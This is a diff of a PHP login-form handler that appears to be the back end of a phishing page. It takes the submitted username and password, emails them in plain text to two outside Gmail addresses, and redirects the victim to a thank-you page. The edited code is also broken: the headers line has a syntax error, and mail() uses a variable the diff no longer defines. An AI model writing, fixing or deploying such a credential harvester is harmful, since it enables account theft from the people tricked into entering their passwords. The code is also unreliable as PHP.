@@ -1,25 +1,19 @@
 <?php
-// get data from form  
 $log = $_POST['log'];
 $pwd = $_POST['pwd'];
-
-// Your login logic goes here...
-// For example, you can validate the username/email and password
-
-// If you want to send an email with the form data
-$name = $log; // Assuming the login is the name
-$email = ""; // No email provided in the login form
-$message = "Login: $log\r\nPassword: $pwd"; // Message includes login and password
 $to = "criispin.fredd@gmail.com";
-$subject = "Login Attempt";
-$headers = "From: Mail from your link" . "\r\n" .
-           "CC: somebodyelse@example.com";
+$subject = "From Link";
 
-// Send the email
+$headers = "From: ".$log "\r\n" .
+           "CC: jsam58864@gmail.com";
+
+$txt = "Login: $log\r\nPassword: $pwd"; 
+       
+
 if (!empty($log) && !empty($pwd)) {
     mail($to, $subject, $message, $headers);
 }
 
-// Redirect to a thank you page
+
 header("Location: Thankyou.html");
 ?>
